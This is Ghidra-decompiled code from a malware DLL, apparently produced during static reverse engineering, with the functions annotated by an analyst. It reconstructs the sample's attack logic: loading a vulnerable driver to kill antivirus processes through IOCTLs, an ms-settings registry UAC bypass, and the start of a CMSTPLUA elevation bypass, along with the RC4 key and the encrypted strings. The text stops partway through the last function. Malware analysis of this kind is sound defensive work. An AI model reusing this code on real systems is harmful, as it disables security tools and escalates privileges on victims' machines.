// Ghidra evidence: functions identified and renamed by Mac Awad
// Sample: Is.Dll  SHA-256 bde2c5e59ab759a7387d88f3b44f7ad1875fe3ecb3c42b0d1ee815be87ab0624
// PDB: MSEdgeWebView.pdb  GUID ef26780e-6ca8-4c89-a8a8-a5e49a2f5ec4
// Decompiled with Ghidra 12.1.4. Static analysis only; the sample is never executed by Ghidra.

// ===== byovd_kill_av @ 0x100105b0: Drops/loads the ardrv driver and kills AV processes in a loop =====
void byovd_kill_av(void)

{
  bool bVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  LPCWSTR pWVar6;
  LPCWSTR pWVar7;
  LPCWSTR pWVar8;
  DWORD *pDVar9;
  wchar_t *pwVar10;
  undefined1 local_19c [24];
  undefined1 local_184 [24];
  undefined1 local_16c [24];
  undefined1 local_154 [24];
  undefined1 local_13c [24];
  undefined1 local_124 [24];
  undefined1 local_10c [24];
  undefined1 local_f4 [24];
  undefined1 local_dc [24];
  undefined1 local_c4 [24];
  undefined4 local_ac;
  undefined1 local_a8 [24];
  basic_string<> local_90 [24];
  undefined1 local_78 [12];
  undefined1 local_6c [12];
  DWORD local_60;
  int local_5c;
  undefined4 local_58;
  int local_54;
  void *local_50;
  void *local_4c;
  void *local_48;
  void *local_44;
  undefined1 *local_40;
  int local_3c;
  undefined1 *local_38;
  void *local_34;
  error_condition local_30 [4];
  error_condition local_2c [7];
  undefined1 local_25;
  int local_24;
  uint local_20;
  HANDLE local_1c;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  puStack_c = &LAB_1017ef92;
  local_10 = ExceptionList;
  local_14 = 0;
  local_8 = 0;
  ExceptionList = &local_10;
  basic_string<>(local_10c,L"3DC0C2FE338F567442B73E4B644B4F1A");
  local_8._0_1_ = 1;
  basic_string<>(local_f4,L"BC81951108");
  local_8._0_1_ = 2;
  rc4_decrypt_hex(local_a8,local_f4,local_10c);
  local_8._0_1_ = 4;
  FUN_1000a650(local_f4);
  local_8._0_1_ = 5;
  FUN_1000a650(local_10c);
  basic_string<>(local_13c,L"3DC0C2FE338F567442B73E4B644B4F1A");
  local_8._0_1_ = 6;
  basic_string<>(local_124,L"81AFDF3F1F113AFD99");
  local_8._0_1_ = 7;
  rc4_decrypt_hex(local_dc,local_124,local_13c);
  local_8._0_1_ = 9;
  FUN_1000a650(local_124);
  local_8._0_1_ = 10;
  FUN_1000a650(local_13c);
  FUN_1000f710(local_78);
  local_8._0_1_ = 0xb;
  basic_string<>(local_16c,(wchar_t *)&DAT_101929a8);
  local_8._0_1_ = 0xc;
  basic_string<>(local_154,L"3DC0C2FE338F567442B73E4B644B4F1A");
  local_8._0_1_ = 0xd;
  rc4_decrypt_hex(local_c4,local_16c,local_154);
  local_8 = CONCAT31(local_8._1_3_,0xf);
  FUN_1000a650(local_154);
  local_20 = 0;
  do {
    local_24 = FUN_1000c6f0(local_c4,0x7c,local_20);
    if (local_24 == -1) {
      local_48 = FUN_1000d5a0(local_c4,local_19c,local_20,0xffffffff);
      local_8 = CONCAT31(local_8._1_3_,0x10);
      local_14 = local_14 | 1;
      local_44 = local_48;
      local_34 = local_48;
    }
    else {
      local_4c = FUN_1000d5a0(local_c4,local_184,local_20,local_24 - local_20);
      local_14 = local_14 | 2;
      local_34 = local_4c;
    }
    local_50 = local_34;
    FUN_1000f590(local_90,local_34);
    local_8 = 0x11;
    if ((local_14 & 2) != 0) {
      local_14 = local_14 & 0xfffffffd;
      FUN_1000a650(local_184);
    }
    local_8 = CONCAT31(local_8._1_3_,0x12);
    if ((local_14 & 1) != 0) {
      local_14 = local_14 & 0xfffffffe;
      FUN_1000a650(local_19c);
    }
    bVar1 = FUN_1001c1a0(local_90);
    if (!bVar1) {
      uVar3 = FUN_1000c7b0(local_90);
      if (uVar3 < 4) {
LAB_10010834:
        std::basic_string<>::operator=(local_90,(char *)L".EXE");
      }
      else {
        pwVar10 = L".exe";
        iVar4 = FUN_1000c3a0(local_90);
        iVar5 = FUN_1000c7b0(local_90);
        iVar4 = FUN_1015242c((wchar_t *)(iVar4 + -8 + iVar5 * 2),pwVar10);
        if (iVar4 != 0) goto LAB_10010834;
      }
      FUN_10012c90(local_78,local_90);
    }
    if (local_24 == -1) break;
    local_20 = local_24 + 1;
    local_8 = CONCAT31(local_8._1_3_,0xf);
    FUN_1000a650(local_90);
  } while( true );
  local_8._0_1_ = 0xf;
  FUN_1000a650(local_90);
  local_8._0_1_ = 0xc;
  FUN_1000a650(local_c4);
  local_8._0_1_ = 0xb;
  FUN_1000a650(local_16c);
  local_25 = 0;
  cVar2 = FUN_1000fd60(5000);
  if (cVar2 == '\0') {
    while (uVar3 = std::_Atomic_long::operator_long((_Atomic_long *)&DAT_101fa5f8),
          (uVar3 & 0xff) == 0) {
      FUN_1000f710(local_6c);
      local_8 = CONCAT31(local_8._1_3_,0x13);
      local_38 = local_78;
      FUN_100120f0(local_38,local_2c);
      FUN_10012970(local_38,&local_54);
      while (bVar1 = FUN_1000fb90(local_2c,&local_54), bVar1) {
        local_58 = FUN_1000a7a0(local_2c);
        pwVar10 = (wchar_t *)FUN_1000c3a0(local_58);
        local_3c = find_process_by_name(pwVar10);
        if (local_3c != 0) {
          FUN_10012b40(local_6c,&local_3c);
        }
        FUN_1000fc70((int *)local_2c);
      }
      bVar1 = FUN_10012930(local_6c);
      if (!bVar1) {
        local_ac = 0x2420031;
        pWVar6 = (LPCWSTR)FUN_1000c3a0(local_dc);
        local_1c = open_driver(pWVar6);
        if (local_1c == (HANDLE)0xffffffff) {
          iVar4 = 0;
          pwVar10 = (wchar_t *)FUN_1000c3a0(&stack0x00000004);
          iVar4 = __waccess(pwVar10,iVar4);
          if (iVar4 != 0) {
            FUN_1000c3a0(&stack0x00000004);
            thunk_FUN_10293111();
          }
          pWVar6 = (LPCWSTR)FUN_1000c3a0(local_a8);
          pWVar7 = (LPCWSTR)FUN_1000c3a0(local_a8);
          pWVar8 = (LPCWSTR)FUN_1000c3a0(&stack0x00000004);
          install_driver_service(pWVar8,pWVar7,pWVar6);
          pWVar6 = (LPCWSTR)FUN_1000c3a0(local_a8);
          iVar4 = start_driver_service(pWVar6);
          if (iVar4 == 0) {
            pWVar6 = (LPCWSTR)FUN_1000c3a0(local_a8);
            FUN_10015bf0(pWVar6);
          }
          pWVar6 = (LPCWSTR)FUN_1000c3a0(local_dc);
          local_1c = open_driver(pWVar6);
          if (local_1c == (HANDLE)0xffffffff) {
            pWVar6 = (LPCWSTR)FUN_1000c3a0(local_a8);
            FUN_10015a30(pWVar6);
            pWVar6 = (LPCWSTR)FUN_1000c3a0(local_a8);
            FUN_10015bf0(pWVar6);
            pWVar6 = (LPCWSTR)FUN_1000c3a0(&stack0x00000004);
            DeleteFileW(pWVar6);
          }
        }
        if (local_1c != (HANDLE)0xffffffff) {
          local_40 = local_6c;
          FUN_100120f0(local_40,local_30);
          FUN_10012970(local_40,&local_5c);
          while (bVar1 = FUN_1000fb90(local_30,&local_5c), bVar1) {
            pDVar9 = (DWORD *)FUN_1000a7a0(local_30);
            local_60 = *pDVar9;
            kill_process_via_driver(local_1c,0x2420031,local_60);
            FUN_1000fc50((int *)local_30);
          }
          CloseHandle(local_1c);
          local_1c = (HANDLE)0xffffffff;
        }
      }
      cVar2 = FUN_1000fd60(2000);
      if (cVar2 != '\0') {
        local_8._0_1_ = 0xb;
        FUN_1000f920(local_6c);
        break;
      }
      local_8._0_1_ = 0xb;
      FUN_1000f920(local_6c);
    }
    local_8._0_1_ = 10;
    FUN_1000f960(local_78);
    local_8._0_1_ = 5;
    FUN_1000a650(local_dc);
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_1000a650(local_a8);
    local_8 = 0xffffffff;
    FUN_1000a650(&stack0x00000004);
  }
  else {
    local_8._0_1_ = 10;
    FUN_1000f960(local_78);
    local_8._0_1_ = 5;
    FUN_1000a650(local_dc);
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_1000a650(local_a8);
    local_8 = 0xffffffff;
    FUN_1000a650(&stack0x00000004);
  }
  ExceptionList = local_10;
  return;
}

// ===== kill_process_via_driver @ 0x100155f0: Sends the kill IOCTL for one PID (3 driver protocols) =====
BOOL __cdecl kill_process_via_driver(HANDLE hDriver,DWORD ioctl,DWORD pid)

{
  undefined1 local_85c;
  undefined1 local_85b [2095];
  HANDLE local_2c;
  undefined4 local_28;
  undefined4 local_24;
  DWORD local_20 [5];
  HANDLE local_c;
  BOOL local_8;
  
  local_8 = 0;
  local_20[2] = 0;
  local_20[4] = 0;
  if ((hDriver == (HANDLE)0x0) || (hDriver == (HANDLE)0xffffffff)) {
    SetLastError(6);
    local_8 = 0;
  }
  else {
    if (ioctl == 0x22cef0) {
      local_c = (HANDLE)0x0;
      local_c = OpenProcess(0x1fffff,0,pid);
      if (local_c == (HANDLE)0x0) {
        return 0;
      }
      local_85c = 0;
      _memset(local_85b,0,0x82f);
      local_2c = (HANDLE)0x0;
      local_28 = 0;
      local_24 = 0;
      _memset(&local_85c,0,0x83c);
      local_2c = local_c;
      local_28 = 0;
      local_8 = DeviceIoControl(hDriver,0x22cef0,&local_85c,0x83c,(LPVOID)0x0,0,local_20 + 4,
                                (LPOVERLAPPED)0x0);
      CloseHandle(local_c);
    }
    else if (ioctl == 0x222024) {
      local_20[0] = pid;
      local_20[1] = 0;
      local_8 = DeviceIoControl(hDriver,0x222024,local_20,8,(LPVOID)0x0,0,local_20 + 4,
                                (LPOVERLAPPED)0x0);
    }
    else {
      local_20[3] = 0;
      local_8 = DeviceIoControl(hDriver,ioctl,&pid,4,local_20 + 3,4,local_20 + 4,(LPOVERLAPPED)0x0);
    }
    if (local_8 == 0) {
      GetLastError();
    }
  }
  return local_8;
}

// ===== open_driver @ 0x100158a0: CreateFileW on the driver device, with retry =====
HANDLE __cdecl open_driver(LPCWSTR param_1)

{
  DWORD DVar1;
  int local_c;
  HANDLE local_8;
  
  local_8 = (HANDLE)0xffffffff;
  if (param_1 == (LPCWSTR)0x0) {
    SetLastError(0x57);
    local_8 = (HANDLE)0xffffffff;
  }
  else {
    local_c = 0;
    while (((local_c < 3 &&
            (local_8 = CreateFileW(param_1,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,
                                   (HANDLE)0x0), local_8 == (HANDLE)0xffffffff)) &&
           ((DVar1 = GetLastError(), DVar1 == 2 || (DVar1 == 3))))) {
      Sleep(0xfa);
      local_c = local_c + 1;
    }
  }
  return local_8;
}

// ===== install_driver_service @ 0x10015760: OpenSCManagerW + CreateServiceW (kernel service) =====
undefined4 __cdecl install_driver_service(LPCWSTR param_1,LPCWSTR param_2,LPCWSTR param_3)

{
  SC_HANDLE hSCManager;
  DWORD DVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_c;
  
  local_c = (SC_HANDLE)0x0;
  local_14 = 0;
  if (((param_1 == (LPCWSTR)0x0) || (param_2 == (LPCWSTR)0x0)) || (param_3 == (LPCWSTR)0x0)) {
    SetLastError(0x57);
    local_14 = 0;
  }
  else {
    hSCManager = OpenSCManagerW((LPCWSTR)0x0,(LPCWSTR)0x0,3);
    if (hSCManager == (SC_HANDLE)0x0) {
      GetLastError();
    }
    else {
      for (local_18 = 0; local_18 < 3; local_18 = local_18 + 1) {
        local_c = CreateServiceW(hSCManager,param_2,param_3,0x10034,1,3,1,param_1,(LPCWSTR)0x0,
                                 (LPDWORD)0x0,(LPCWSTR)0x0,(LPCWSTR)0x0,(LPCWSTR)0x0);
        if (local_c != (SC_HANDLE)0x0) {
          local_14 = 1;
          break;
        }
        DVar1 = GetLastError();
        if (DVar1 == 0x431) {
          local_14 = 1;
          break;
        }
        if (DVar1 != 0x430) break;
        Sleep(300);
      }
    }
    if (local_c != (SC_HANDLE)0x0) {
      CloseServiceHandle(local_c);
    }
    if (hSCManager != (SC_HANDLE)0x0) {
      CloseServiceHandle(hSCManager);
    }
  }
  return local_14;
}

// ===== start_driver_service @ 0x10015940: OpenServiceW + StartServiceW =====
undefined4 __cdecl start_driver_service(LPCWSTR param_1)

{
  SC_HANDLE hSCManager;
  BOOL BVar1;
  DWORD DVar2;
  undefined4 local_14;
  SC_HANDLE local_8;
  
  local_8 = (SC_HANDLE)0x0;
  local_14 = 0;
  if (param_1 == (LPCWSTR)0x0) {
    SetLastError(0x57);
    local_14 = 0;
  }
  else {
    hSCManager = OpenSCManagerW((LPCWSTR)0x0,(LPCWSTR)0x0,1);
    if (hSCManager == (SC_HANDLE)0x0) {
      GetLastError();
    }
    else {
      local_8 = OpenServiceW(hSCManager,param_1,0x14);
      if (local_8 == (SC_HANDLE)0x0) {
        GetLastError();
      }
      else {
        BVar1 = StartServiceW(local_8,0,(LPCWSTR *)0x0);
        if (BVar1 == 0) {
          DVar2 = GetLastError();
          if (DVar2 == 0x420) {
            local_14 = 1;
          }
        }
        else {
          local_14 = 1;
        }
      }
    }
    if (local_8 != (SC_HANDLE)0x0) {
      CloseServiceHandle(local_8);
    }
    if (hSCManager != (SC_HANDLE)0x0) {
      CloseServiceHandle(hSCManager);
    }
  }
  return local_14;
}

// ===== find_process_by_name @ 0x10016880: Toolhelp snapshot, returns PID by process name =====
undefined4 __cdecl find_process_by_name(wchar_t *param_1)

{
  int iVar1;
  undefined4 local_238 [2];
  undefined4 local_230;
  wchar_t local_214 [260];
  undefined4 local_c;
  HANDLE local_8;
  
  local_238[0] = 0x22c;
  local_8 = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (local_8 == (HANDLE)0xffffffff) {
    local_c = 0;
  }
  else {
    iVar1 = Process32FirstW(local_8,local_238);
    if (iVar1 == 0) {
      CloseHandle(local_8);
      local_c = 0;
    }
    else {
      local_c = 0;
      do {
        iVar1 = FUN_1015242c(local_214,param_1);
        if (iVar1 == 0) {
          local_c = local_230;
          break;
        }
        iVar1 = Process32NextW(local_8,local_238);
      } while (iVar1 != 0);
      CloseHandle(local_8);
    }
  }
  return local_c;
}

// ===== rc4_decrypt_hex @ 0x1001dd90: Decrypts hex strings with RC4 key 3DC0C2FE338F567442B73E4B644B4F1A =====
void * __cdecl rc4_decrypt_hex(void *param_1,undefined4 param_2,undefined4 param_3)

{
  LPCWSTR pWVar1;
  int iVar2;
  LPSTR pCVar3;
  int iVar4;
  size_t sVar5;
  LPCSTR pCVar6;
  LPWSTR pWVar7;
  LPBOOL pBVar8;
  uint cchWideChar;
  undefined1 local_a4 [24];
  _String_alloc<> local_8c [24];
  undefined1 local_74 [24];
  _String_alloc<> local_5c [24];
  wchar_t *local_44;
  char *local_40;
  char *local_3c;
  LPWSTR local_38;
  LPSTR local_34;
  LPSTR local_30;
  uint local_2c;
  uint local_28;
  size_t local_24;
  size_t local_20;
  LPWSTR local_1c;
  LPSTR local_18;
  LPSTR local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &lpUsedDefaultChar_1017f5ab;
  local_10 = ExceptionList;
  local_2c = 0;
  pBVar8 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  iVar4 = 0;
  pCVar3 = (LPSTR)0x0;
  iVar2 = -1;
  ExceptionList = &local_10;
  pWVar1 = (LPCWSTR)FUN_1000c3a0(param_2);
  local_20 = WideCharToMultiByte(0,0,pWVar1,iVar2,pCVar3,iVar4,pCVar6,pBVar8);
  pBVar8 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  iVar4 = 0;
  pCVar3 = (LPSTR)0x0;
  iVar2 = -1;
  pWVar1 = (LPCWSTR)FUN_1000c3a0(param_3);
  local_24 = WideCharToMultiByte(0,0,pWVar1,iVar2,pCVar3,iVar4,pCVar6,pBVar8);
  local_30 = (LPSTR)FUN_1001f083(local_20);
  local_14 = local_30;
  local_34 = (LPSTR)FUN_1001f083(local_24);
  pBVar8 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  iVar2 = -1;
  pCVar3 = local_14;
  sVar5 = local_20;
  local_18 = local_34;
  pWVar1 = (LPCWSTR)FUN_1000c3a0(param_2);
  WideCharToMultiByte(0,0,pWVar1,iVar2,pCVar3,sVar5,pCVar6,pBVar8);
  pBVar8 = (LPBOOL)0x0;
  pCVar6 = (LPCSTR)0x0;
  iVar2 = -1;
  pCVar3 = local_18;
  sVar5 = local_24;
  pWVar1 = (LPCWSTR)FUN_1000c3a0(param_3);
  WideCharToMultiByte(0,0,pWVar1,iVar2,pCVar3,sVar5,pCVar6,pBVar8);
  basic_string<>(local_8c,local_18);
  local_8 = 0;
  basic_string<>(local_74,local_14);
  local_8._0_1_ = 1;
  FUN_1001dc10(local_5c,local_74,local_8c);
  local_8._0_1_ = 3;
  FUN_10018cb0(local_74);
  local_8 = CONCAT31(local_8._1_3_,4);
  FUN_10018cb0(local_8c);
  iVar4 = 0;
  pWVar7 = (LPWSTR)0x0;
  iVar2 = -1;
  pCVar6 = (LPCSTR)FUN_1001bf20(local_5c);
  local_28 = MultiByteToWideChar(0,0,pCVar6,iVar2,pWVar7,iVar4);
  pWVar7 = (LPWSTR)FUN_1001f083(-(uint)((int)((ulonglong)local_28 * 2 >> 0x20) != 0) |
                                (uint)((ulonglong)local_28 * 2));
  iVar2 = -1;
  cchWideChar = local_28;
  local_38 = pWVar7;
  local_1c = pWVar7;
  pCVar6 = (LPCSTR)FUN_1001bf20(local_5c);
  MultiByteToWideChar(0,0,pCVar6,iVar2,pWVar7,cchWideChar);
  basic_string<>(local_a4,local_1c);
  local_3c = local_14;
  thunk_FUN_10149507(local_14);
  local_40 = local_18;
  thunk_FUN_10149507(local_18);
  local_44 = local_1c;
  thunk_FUN_10149507(local_1c);
  FUN_1000f590(param_1,local_a4);
  local_2c = local_2c | 1;
  FUN_1000a650(local_a4);
  local_8 = 0xffffffff;
  FUN_10018cb0(local_5c);
  ExceptionList = local_10;
  return param_1;
}

// ===== uac_bypass_ms_settings @ 0x10019c30: ms-settings DelegateExecute + ComputerDefaults.exe, then RegDeleteTreeW cleanup =====
undefined4 __cdecl uac_bypass_ms_settings(wchar_t *param_1)

{
  bool bVar1;
  int iVar2;
  UINT UVar3;
  undefined4 uVar4;
  LPCWSTR pWVar5;
  uint uVar6;
  short *psVar7;
  wchar_t *pwVar8;
  BYTE *pBVar9;
  BOOL BVar10;
  DWORD DVar11;
  LPWSTR lpClass;
  DWORD DVar12;
  REGSAM samDesired;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  HKEY *phkResult;
  LPDWORD lpdwDisposition;
  DWORD cbData;
  wchar_t local_11ec;
  undefined1 local_11ea [2046];
  WCHAR local_9ec;
  undefined1 local_9ea [2046];
  undefined1 local_1ec [24];
  undefined1 local_1d4 [24];
  undefined1 local_1bc [24];
  undefined1 local_1a4 [24];
  undefined1 local_18c [24];
  undefined1 local_174 [24];
  undefined1 local_15c [24];
  undefined1 local_144 [24];
  undefined1 local_12c [24];
  DWORD local_114;
  SHELLEXECUTEINFOW local_110;
  undefined1 local_d4 [24];
  undefined1 local_bc [24];
  undefined1 local_a4 [24];
  undefined1 local_8c [24];
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  LSTATUS local_68;
  undefined *local_64;
  undefined4 local_60;
  undefined4 local_5c;
  LSTATUS local_58;
  DWORD local_54;
  void *local_50;
  undefined4 local_4c;
  LSTATUS local_48;
  undefined4 local_44;
  undefined4 local_40;
  DWORD local_3c;
  basic_string<> local_38 [24];
  DWORD local_20;
  undefined4 local_1c;
  wchar_t *local_18;
  HKEY local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1017f2b1;
  local_10 = ExceptionList;
  if ((param_1 == (wchar_t *)0x0) || (*param_1 == L'\0')) {
    local_74 = 0;
  }
  else {
    local_1c = 0;
    local_14 = (HKEY)0x0;
    local_9ec = L'\0';
    ExceptionList = &local_10;
    _memset(local_9ea,0,0x7fe);
    iVar2 = SHGetFolderPathW(0,0x24,0,0,&local_9ec);
    if (((iVar2 < 0) || (local_9ec == L'\0')) &&
       (UVar3 = GetWindowsDirectoryW(&local_9ec,0x400), UVar3 == 0)) {
      ExceptionList = local_10;
      return 0;
    }
    basic_string<>(local_a4,L"81A088100A0633BCDDFAF1C0D3E01772641A7BD87AD04D02CEC75875D6BA");
    local_8 = 0;
    basic_string<>(local_174,L"3DC0C2FE338F567442B73E4B644B4F1A");
    local_8._0_1_ = 1;
    rc4_decrypt_hex(local_8c,local_a4,local_174);
    local_8._0_1_ = 3;
    FUN_1000a650(local_174);
    bVar1 = FUN_1001c1a0(local_8c);
    if (bVar1) {
      local_74 = 0;
      local_8 = (uint)local_8._1_3_ << 8;
      FUN_1000a650(local_8c);
      local_8 = 0xffffffff;
      FUN_1000a650(local_a4);
    }
    else {
      local_11ec = L'\0';
      _memset(local_11ea,0,0x7fe);
      uVar4 = FUN_1000c3a0(local_8c);
      FID_conflict__swprintf(&local_11ec,(wchar_t *)0x400,L"%s%s",&local_9ec,uVar4);
      for (local_18 = &local_11ec;
          ((*local_18 != L'\0' && (*local_18 != L' ')) &&
          ((*local_18 != L'\t' && ((*local_18 != L'\r' && (*local_18 != L'\n'))))));
          local_18 = local_18 + 1) {
      }
      *local_18 = L'\0';
      local_3c = GetFileAttributesW(&local_11ec);
      if (local_3c == 0xffffffff) {
        local_40 = 0;
        local_8 = (uint)local_8._1_3_ << 8;
        FUN_1000a650(local_8c);
        local_8 = 0xffffffff;
        FUN_1000a650(local_a4);
        local_74 = local_40;
      }
      else {
        basic_string<>(local_d4,
                       L"8EBCB73729220CCAB3E5FEEEEDC327555D256C904FF46C3AF3FA3143F28C19BB61E9B4444B27042B5BA355A1CF2BE8"
                      );
        local_8._0_1_ = 4;
        basic_string<>(local_18c,L"3DC0C2FE338F567442B73E4B644B4F1A");
        local_8._0_1_ = 5;
        rc4_decrypt_hex(local_bc,local_d4,local_18c);
        local_8._0_1_ = 7;
        FUN_1000a650(local_18c);
        bVar1 = FUN_1001c1a0(local_bc);
        if (bVar1) {
          local_44 = 0;
          local_8._0_1_ = 4;
          FUN_1000a650(local_bc);
          local_8._0_1_ = 3;
          FUN_1000a650(local_d4);
          local_8 = (uint)local_8._1_3_ << 8;
          FUN_1000a650(local_8c);
          local_8 = 0xffffffff;
          FUN_1000a650(local_a4);
          local_74 = local_44;
        }
        else {
          lpdwDisposition = (LPDWORD)0x0;
          phkResult = &local_14;
          lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
          samDesired = 0x20006;
          DVar12 = 0;
          lpClass = (LPWSTR)0x0;
          DVar11 = 0;
          pWVar5 = (LPCWSTR)FUN_1000c3a0(local_bc);
          local_48 = RegCreateKeyExW((HKEY)0x80000001,pWVar5,DVar11,lpClass,DVar12,samDesired,
                                     lpSecurityAttributes,phkResult,lpdwDisposition);
          if (local_48 == 0) {
            basic_string<>(local_38,param_1);
            local_8 = CONCAT31(local_8._1_3_,8);
            uVar6 = FUN_1000c7b0(local_38);
            if (((1 < uVar6) && (psVar7 = (short *)FUN_1001c570(local_38), *psVar7 == 0x22)) &&
               (pwVar8 = std::basic_string<>::back(local_38), *pwVar8 == L'\"')) {
              iVar2 = FUN_1000c7b0(local_38);
              local_50 = FUN_1000d5a0(local_38,local_1ec,1,iVar2 - 2);
              FUN_100154e0(local_38,local_50);
              FUN_1000a650(local_1ec);
            }
            iVar2 = FUN_1000c7b0(local_38);
            DVar11 = iVar2 * 2 + 2;
            local_54 = DVar11;
            pBVar9 = (BYTE *)FUN_1000c3a0(local_38);
            local_58 = RegSetValueExW(local_14,(LPCWSTR)0x0,0,1,pBVar9,DVar11);
            if (local_58 == 0) {
              basic_string<>(local_144,L"99B6BD2639220ACAAAFEF7ECEBC427");
              local_8._0_1_ = 9;
              basic_string<>(local_1a4,L"3DC0C2FE338F567442B73E4B644B4F1A");
              local_8._0_1_ = 10;
              rc4_decrypt_hex(local_12c,local_144,local_1a4);
              local_8._0_1_ = 0xc;
              FUN_1000a650(local_1a4);
              bVar1 = FUN_1001c1a0(local_12c);
              if (bVar1) {
                RegCloseKey(local_14);
                local_60 = 0;
                local_8._0_1_ = 9;
                FUN_1000a650(local_12c);
                local_8._0_1_ = 8;
                FUN_1000a650(local_144);
                local_8._0_1_ = 7;
                FUN_1000a650(local_38);
                local_8._0_1_ = 4;
                FUN_1000a650(local_bc);
                local_8._0_1_ = 3;
                FUN_1000a650(local_d4);
                local_8 = (uint)local_8._1_3_ << 8;
                FUN_1000a650(local_8c);
                local_8 = 0xffffffff;
                FUN_1000a650(local_a4);
                local_74 = local_60;
              }
              else {
                local_64 = &DAT_10196674;
                cbData = 2;
                pBVar9 = "";
                DVar12 = 1;
                DVar11 = 0;
                pWVar5 = (LPCWSTR)FUN_1000c3a0(local_12c);
                local_68 = RegSetValueExW(local_14,pWVar5,DVar11,DVar12,pBVar9,cbData);
                if (local_68 == 0) {
                  RegCloseKey(local_14);
                  local_14 = (HKEY)0x0;
                  local_110.cbSize = 0;
                  _memset(&local_110.fMask,0,0x38);
                  local_110.cbSize = 0x3c;
                  local_110.fMask = 0x440;
                  local_110.hwnd = (HWND)0x0;
                  local_110.lpVerb = (LPCWSTR)0x0;
                  local_110.lpFile = &local_11ec;
                  local_110.lpParameters = (LPCWSTR)0x0;
                  local_110.lpDirectory = (LPCWSTR)0x0;
                  local_110.nShow = 0;
                  BVar10 = ShellExecuteExW(&local_110);
                  if (BVar10 == 0) {
                    local_114 = GetLastError();
                  }
                  else if (local_110.hProcess == (HANDLE)0x0) {
                    local_1c = 1;
                  }
                  else {
                    local_20 = WaitForSingleObject(local_110.hProcess,3000);
                    if ((local_20 == 0) || (local_20 == 0x102)) {
                      local_1c = 1;
                    }
                    CloseHandle(local_110.hProcess);
                    local_110.hProcess = (HANDLE)0x0;
                  }
                  if (local_14 != (HKEY)0x0) {
                    RegCloseKey(local_14);
                    local_14 = (HKEY)0x0;
                  }
                  if (local_110.hProcess != (HANDLE)0x0) {
                    CloseHandle(local_110.hProcess);
                    local_110.hProcess = (HANDLE)0x0;
                  }
                  basic_string<>(local_1d4,
                                 L"8EBCB73729220CCAB3E5FEEEEDC327555D256C904FF46C3AF3FA3143");
                  local_8._0_1_ = 0xd;
                  basic_string<>(local_1bc,L"3DC0C2FE338F567442B73E4B644B4F1A");
                  local_8._0_1_ = 0xe;
                  rc4_decrypt_hex(local_15c,local_1d4,local_1bc);
                  local_8 = CONCAT31(local_8._1_3_,0xd);
                  FUN_1000a650(local_1bc);
                  bVar1 = FUN_1001c1a0(local_15c);
                  if (!bVar1) {
                    pWVar5 = (LPCWSTR)FUN_1000c3a0(local_15c);
                    RegDeleteTreeW((HKEY)0x80000001,pWVar5);
                  }
                  FUN_1000a650(local_15c);
                  local_8._0_1_ = 0xc;
                  FUN_1000a650(local_1d4);
                  local_70 = local_1c;
                  local_8._0_1_ = 9;
                  FUN_1000a650(local_12c);
                  local_8._0_1_ = 8;
                  FUN_1000a650(local_144);
                  local_8._0_1_ = 7;
                  FUN_1000a650(local_38);
                  local_8._0_1_ = 4;
                  FUN_1000a650(local_bc);
                  local_8._0_1_ = 3;
                  FUN_1000a650(local_d4);
                  local_8 = (uint)local_8._1_3_ << 8;
                  FUN_1000a650(local_8c);
                  local_8 = 0xffffffff;
                  FUN_1000a650(local_a4);
                  local_74 = local_70;
                }
                else {
                  RegCloseKey(local_14);
                  local_6c = 0;
                  local_8._0_1_ = 9;
                  FUN_1000a650(local_12c);
                  local_8._0_1_ = 8;
                  FUN_1000a650(local_144);
                  local_8._0_1_ = 7;
                  FUN_1000a650(local_38);
                  local_8._0_1_ = 4;
                  FUN_1000a650(local_bc);
                  local_8._0_1_ = 3;
                  FUN_1000a650(local_d4);
                  local_8 = (uint)local_8._1_3_ << 8;
                  FUN_1000a650(local_8c);
                  local_8 = 0xffffffff;
                  FUN_1000a650(local_a4);
                  local_74 = local_6c;
                }
              }
            }
            else {
              RegCloseKey(local_14);
              local_5c = 0;
              local_8._0_1_ = 7;
              FUN_1000a650(local_38);
              local_8._0_1_ = 4;
              FUN_1000a650(local_bc);
              local_8._0_1_ = 3;
              FUN_1000a650(local_d4);
              local_8 = (uint)local_8._1_3_ << 8;
              FUN_1000a650(local_8c);
              local_8 = 0xffffffff;
              FUN_1000a650(local_a4);
              local_74 = local_5c;
            }
          }
          else {
            local_4c = 0;
            local_8._0_1_ = 4;
            FUN_1000a650(local_bc);
            local_8._0_1_ = 3;
            FUN_1000a650(local_d4);
            local_8 = (uint)local_8._1_3_ << 8;
            FUN_1000a650(local_8c);
            local_8 = 0xffffffff;
            FUN_1000a650(local_a4);
            local_74 = local_4c;
          }
        }
      }
    }
  }
  ExceptionList = local_10;
  return local_74;
}

// ===== uac_bypass_cmstplua @ 0x100198a0: CMSTPLUA elevation moniker via CoGetObject =====
uint __cdecl uac_bypass_cmstplua(undefined4 param_1)

{
  int iVar1;
  LPCWSTR pszName;
  BIND_OPTS *pBindOptions;
  BIND_OPTS **riid;
  int **ppv;
  undefined2 local_88c;
  undefined1 local_88a [2046];
  undefined1 local_8c [24];
  undefined1 local_74 [24];
  undefined1 local_5c [24];
  BIND_OPTS local_44;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1017f21b;
  local_10 = ExceptionList;
  local_14 = (int *)0x100198c2;
  ExceptionList = &local_10;
  FUN_10017f20((int *)&DAT_10200f70,
